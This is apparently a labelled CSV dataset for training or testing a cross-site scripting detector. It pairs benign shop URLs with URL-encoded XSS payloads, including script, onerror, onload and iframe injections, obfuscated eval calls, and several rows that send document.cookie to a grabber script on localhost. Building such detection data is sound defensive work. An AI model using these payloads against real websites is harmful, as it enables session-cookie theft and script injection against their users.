text,label
/login?username1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/order?item=book&quantity=41&category=stationery&color=yellow,0
/order?action1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/checkout?total=70&currency=USD&size=small,0
/search?q=apple&color=red&size=medium,0
/checkout?search_term=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/api/items?id=326&details=true,0
/login?password123=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/user/profile?id=5004&view=summary&size=small,0
/wishlist?electronics=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/api/items?id=762&details=true&color=red,0
/products?category=electronics&page=10,0
/products?category=electronics&page=1,0
/checkout?book=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/checkout?total=844&currency=USD&size=large,0
/checkout?category1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/wishlist?book=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/user/profile?id=5386&view=summary,0
/cart?action=view&item=monitor&color=yellow,0
/products?category=electronics&page=8,0
/user/profile?id=9007&view=summary,0
/order?query=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/checkout?total=620&currency=USD&size=medium,0
/cart?category1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/order?item=notebook&quantity=85&category=stationery&color=white&size=small,0
/wishlist?banana=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?item=notebook&quantity=56,0
/api?category1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/cart?action=remove&item=tablet&size=medium,0
/cart?banana=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/login?phone=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/api?banana=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/wishlist?laptop=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/cart?action=remove&item=pen,0
/cart?username1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?book=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/order?electronics=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/checkout?total=931&currency=USD,0
/api?password123=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/user/profile?id=9675&view=summary&size=medium,0
/api?action1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?electronics=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/login?phone=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?category=furniture&page=7,0
/cart?apple=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/search?action1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/order?item=shirt&quantity=89,0
/products?banana=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/products?apple=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?category=groceries&page=2&size=medium,0
/user/profile?id=6393&view=summary,0
/wishlist?item=notebook&action=add&color=red,0
/products?value1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/user/profile?id=7322&view=summary,0
/wishlist?phone=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/api?shoes=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/checkout?book=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/wishlist?item=bottle&action=add&size=large,0
/wishlist?item=chair&action=add&size=small,0
/cart?action=remove&item=tablet&color=black,0
/wishlist?item=pen&action=add&size=small,0
/user/profile?id=6750&view=summary,0
/order?category1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/api/items?id=315&details=true&size=small,0
/cart?action=remove&item=tablet&size=small,0
/products?laptop=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/search?banana=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/checkout?book=%3Csvg%20onload%3Dalert%281%29%3E,1
/checkout?value1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/user/profile?id=4684&view=summary,0
/wishlist?apple=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/checkout?total=464&currency=USD,0
/user/profile?id=3769&view=summary,0
/order?shoes=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/cart?shoes=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/products?category=groceries&page=4,0
/cart?action=remove&item=tablet&color=green,0
/checkout?total=327&currency=USD&color=black,0
/order?item=bottle&quantity=77,0
/api?laptop=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/products?apple=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/cart?laptop=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/user/profile?id=7338&view=summary,0
/checkout?total=553&currency=USD&color=blue,0
/products?category=groceries&page=8&color=yellow,0
/checkout?total=661&currency=USD,0
/wishlist?username1=%3Csvg%20onload%3Dalert%281%29%3E,1
/user/profile?id=3862&view=summary&size=large,0
/api?query=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/wishlist?item=phone&action=add,0
/order?shoes=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?category=stationery&page=5&color=white,0
/order?item=chair&quantity=51&category=furniture,0
/order?shoes=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/checkout?query=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/order?item=pen&quantity=42&category=electronics,0
/api/items?id=574&details=true&color=red,0
/api?laptop=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/wishlist?apple=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/api/items?id=474&details=true,0
/search?password123=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/api/items?id=156&details=true&color=green&size=large,0
/checkout?book=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/products?category=clothing&page=5,0
/search?q=notebook&color=blue,0
/login?electronics=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/checkout?total=553&currency=USD&color=blue,0
/search?action1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/order?item=shirt&quantity=27&category=furniture,0
/login?apple=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/products?category1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api?apple=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api/items?id=268&details=true&color=blue,0
/products?category=furniture&page=8&color=black,0
/products?query=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/search?q=apple&color=yellow,0
/order?item=bottle&quantity=5&category=furniture,0
/user/profile?id=1163&view=summary,0
/api/items?id=879&details=true,0
/api?username1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/user/profile?id=1702&view=summary,0
/search?electronics=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/search?book=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/user/profile?id=1485&view=summary&color=green&size=large,0
/wishlist?electronics=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api?category1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/wishlist?search_term=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/order?query=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/products?category=clothing&page=6,0
/wishlist?item=chair&action=add,0
/wishlist?action1=%3Csvg%20onload%3Dalert%281%29%3E,1
/login?book=%3Csvg%20onload%3Dalert%281%29%3E,1
/products?book=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/cart?action=remove&item=apple&color=red,0
/wishlist?search_term=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/cart?action=remove&item=shirt&color=blue,0
/cart?action=add&item=shirt&size=small,0
/wishlist?item=monitor&action=add&color=blue,0
/checkout?username1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/api/items?id=881&details=true&color=blue,0
/products?query=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/api/items?id=100&details=true,0
/wishlist?item=notebook&action=remove&color=black,0
/cart?action=update&item=apple,0
/api/items?id=485&details=true,0
/api?shoes=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/wishlist?item=phone&action=add&color=yellow,0
/order?item=chair&quantity=4&color=white,0
/cart?apple=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/order?username1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/wishlist?item=monitor&action=remove&color=black,0
/cart?action=remove&item=notebook,0
/products?category=furniture&page=1,0
/products?category=clothing&page=4,0
/cart?action=add&item=shirt,0
/products?category=electronics&page=6,0
/products?phone=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/checkout?total=210&currency=USD&size=small,0
/products?action1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/api/items?id=622&details=true,0
/user/profile?id=3496&view=summary&color=white,0
/user/profile?id=4334&view=summary&size=medium,0
/user/profile?id=1439&view=summary&color=yellow&size=large,0
/order?item=monitor&quantity=26&category=electronics&color=red,0
/order?item=phone&quantity=73&color=yellow,0
/cart?laptop=%3Csvg%20onload%3Dalert%281%29%3E,1
/order?item=shirt&quantity=15,0
/cart?phone=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/order?laptop=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/checkout?action1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?query=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/wishlist?item=phone&action=add&color=black,0
/checkout?laptop=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/cart?action=view&item=book,0
/products?query=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/search?q=shirt,0
/order?search_term=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/search?book=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/search?electronics=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/search?value1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/api/items?id=177&details=true,0
/search?q=monitor,0
/wishlist?category1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/user/profile?id=1269&view=summary,0
/wishlist?laptop=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/checkout?phone=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/user/profile?id=9393&view=summary,0
/wishlist?action1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?category=clothing&page=7,0
/api/items?id=285&details=true&size=medium,0
/products?banana=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/search?q=bottle&size=large,0
/api/items?id=454&details=true&color=red,0
/cart?username1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/user/profile?id=9921&view=summary,0
/products?category1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?action=remove&item=book&size=large,0
/user/profile?id=6888&view=summary,0
/order?search_term=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/login?laptop=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/search?action1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/products?value1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/search?q=apple&color=blue&size=large,0
/checkout?total=743&currency=USD&size=large,0
/checkout?total=142&currency=USD,0
/order?item=apple&quantity=24,0
/user/profile?id=4246&view=summary&color=blue,0
/search?category1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/cart?action=remove&item=pen,0
/search?apple=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/search?password123=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/wishlist?item=pen&action=add&size=large,0
/search?q=groceries&color=yellow&size=small,0
/user/profile?id=7903&view=summary,0
/api/items?id=759&details=true,0
/api?password123=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/api/items?id=444&details=true&color=blue,0
/search?phone=%3Csvg%20onload%3Dalert%281%29%3E,1
/login?password123=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/user/profile?id=1632&view=summary,0
/checkout?total=148&currency=USD,0
/user/profile?id=4149&view=summary,0
/products?phone=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/user/profile?id=2933&view=summary,0
/products?electronics=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/search?electronics=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/search?book=%3Csvg%20onload%3Dalert%281%29%3E,1
/api?password123=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/search?q=tablet&color=black,0
/cart?query=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/cart?search_term=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?phone=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/checkout?total=721&currency=USD,0
/api/items?id=362&details=true,0
/cart?action=view&item=phone&size=medium,0
/products?action1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/search?action1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/user/profile?id=9347&view=summary&color=red,0
/order?item=bottle&quantity=80,0
/wishlist?item=shirt&action=remove,0
/products?electronics=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/wishlist?item=book&action=add&size=small,0
/products?apple=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/wishlist?item=pen&action=add&color=black,0
/api/items?id=796&details=true,0
/cart?search_term=%3Csvg%20onload%3Dalert%281%29%3E,1
/search?q=furniture&color=white,0
/cart?banana=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api/items?id=561&details=true,0
/wishlist?action1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/checkout?banana=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/api/items?id=741&details=true,0
/checkout?total=822&currency=USD,0
/products?category=stationery&page=8,0
/wishlist?item=shirt&action=add&size=medium,0
/api/items?id=466&details=true&color=red&size=large,0
/products?category=stationery&page=10&size=large,0
/user/profile?id=3594&view=summary,0
/api?value1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/products?category=groceries&page=7&size=large,0
/products?phone=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/search?laptop=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?category1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/order?value1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/checkout?total=941&currency=USD&color=green,0
/order?category1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/products?category1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/products?laptop=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/checkout?query=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?category1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?item=tablet&quantity=23&color=yellow,0
/search?phone=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/order?username1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?value1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/wishlist?item=pen&action=remove,0
/products?book=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/user/profile?id=3175&view=summary,0
/order?item=monitor&quantity=6&category=furniture&size=small,0
/user/profile?id=6603&view=summary,0
/user/profile?id=8883&view=summary,0
/user/profile?id=1738&view=summary,0
/order?phone=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/wishlist?item=chair&action=add,0
/user/profile?id=1966&view=summary&color=blue,0
/order?item=tablet&quantity=57&category=electronics,0
/checkout?apple=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/user/profile?id=2000&view=summary,0
/cart?banana=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/search?query=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/login?phone=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/wishlist?item=monitor&action=add&color=white,0
/wishlist?item=pen&action=add&color=red,0
/search?q=electronics,0
/wishlist?item=tablet&action=add&size=small,0
/search?q=shirt&size=medium,0
/order?item=book&quantity=66&category=furniture,0
/api?laptop=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/products?category=clothing&page=9,0
/order?value1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/products?shoes=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/order?username1=%3Csvg%20onload%3Dalert%281%29%3E,1
/wishlist?action1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?action=remove&item=shirt,0
/login?apple=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?item=notebook&quantity=42&color=green&size=medium,0
/cart?password123=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/api/items?id=195&details=true,0
/api?book=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/checkout?total=849&currency=USD,0
/order?query=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?electronics=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/search?apple=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/order?item=chair&quantity=42&color=red,0
/wishlist?item=phone&action=add,0
/products?category=electronics&page=3,0
/api/items?id=733&details=true,0
/cart?laptop=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/search?q=notebook,0
/user/profile?id=7454&view=summary&size=small,0
/api/items?id=337&details=true&color=red,0
/order?username1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/user/profile?id=6074&view=summary,0
/cart?banana=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/wishlist?item=tablet&action=add,0
/products?apple=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/login?electronics=%3Csvg%20onload%3Dalert%281%29%3E,1
/api/items?id=132&details=true&color=green&size=small,0
/wishlist?laptop=%3Csvg%20onload%3Dalert%281%29%3E,1
/login?laptop=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?value1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/products?search_term=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/cart?action=remove&item=monitor,0
/products?phone=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/order?item=notebook&quantity=92,0
/api?phone=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/order?password123=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/search?category1=%3Csvg%20onload%3Dalert%281%29%3E,1
/wishlist?item=notebook&action=remove&color=red,0
/login?search_term=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/api?apple=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/order?item=tablet&quantity=10,0
/search?q=apple,0
/products?shoes=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/order?query=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/checkout?total=99&currency=USD,0
/wishlist?banana=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/wishlist?item=tablet&action=add,0
/wishlist?item=apple&action=add,0
/search?action1=%3Csvg%20onload%3Dalert%281%29%3E,1
/search?laptop=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/api/items?id=608&details=true,0
/user/profile?id=9090&view=summary,0
/search?book=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/api/items?id=101&details=true,0
/products?category=furniture&page=4&color=blue,0
/products?category1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/products?query=%3Csvg%20onload%3Dalert%281%29%3E,1
/cart?shoes=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/wishlist?laptop=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/wishlist?laptop=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/api?query=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/user/profile?id=3148&view=summary,0
/search?query=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/search?username1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/search?q=groceries,0
/wishlist?category1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/wishlist?item=notebook&action=remove,0
/cart?action=view&item=bottle,0
/search?q=phone&color=blue,0
/cart?action=view&item=tablet&color=white,0
/products?category=clothing&page=7,0
/products?category=groceries&page=1&color=yellow&size=medium,0
/products?electronics=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/search?username1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/wishlist?book=%3Csvg%20onload%3Dalert%281%29%3E,1
/checkout?total=598&currency=USD&color=yellow,0
/login?value1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/wishlist?item=bottle&action=remove&color=white&size=small,0
/products?laptop=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/user/profile?id=1165&view=summary&size=small,0
/user/profile?id=9831&view=summary,0
/search?value1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/checkout?category1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/order?item=notebook&quantity=78,0
/checkout?total=998&currency=USD,0
/order?phone=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/wishlist?electronics=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/search?action1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/products?apple=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/products?category=stationery&page=7&size=medium,0
/wishlist?laptop=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/checkout?total=984&currency=USD&color=white,0
/api?value1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/products?banana=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/login?banana=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/search?banana=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?book=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/cart?book=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/login?shoes=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/wishlist?shoes=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/checkout?total=631&currency=USD,0
/order?item=tablet&quantity=92&color=white,0
/search?password123=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/api?query=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/search?q=chair,0
/user/profile?id=2633&view=summary&color=black,0
/api/items?id=970&details=true,0
/search?q=groceries,0
/order?apple=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/checkout?electronics=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/wishlist?item=book&action=add&color=black,0
/search?value1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/api/items?id=873&details=true&size=small,0
/search?electronics=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api?apple=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/api/items?id=698&details=true&color=green,0
/search?q=electronics,0
/api/items?id=331&details=true,0
/order?item=monitor&quantity=43,0
/search?q=shirt,0
/search?electronics=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/order?item=book&quantity=66&category=electronics,0
/checkout?username1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/wishlist?item=chair&action=remove&size=medium,0
/wishlist?item=chair&action=remove&color=blue,0
/products?category=clothing&page=1,0
/login?password123=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/cart?password123=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/checkout?electronics=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/user/profile?id=6646&view=summary&color=black,0
/cart?shoes=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/checkout?total=451&currency=USD,0
/checkout?total=700&currency=USD,0
/api/items?id=881&details=true&color=white,0
